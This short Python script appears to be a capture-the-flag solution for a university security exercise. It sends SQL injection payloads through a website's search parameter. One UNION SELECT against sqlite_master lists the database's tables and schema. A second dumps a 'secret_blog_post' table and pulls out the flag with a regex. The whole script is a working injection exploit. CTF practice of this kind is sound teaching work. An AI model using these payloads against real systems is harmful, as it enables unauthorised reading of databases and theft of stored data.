import requests
import re

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:22261"

s = requests.Session()

s.get(link + "/?search=' UNION SELECT null, tbl_name, sql FROM sqlite_master WHERE type = 'table';--") # get table names and column names
print(re.search('SSof{.*}', s.get(link + "/?search=' UNION SELECT id, title, content FROM secret_blog_post;--").text).group(0)) # get the flag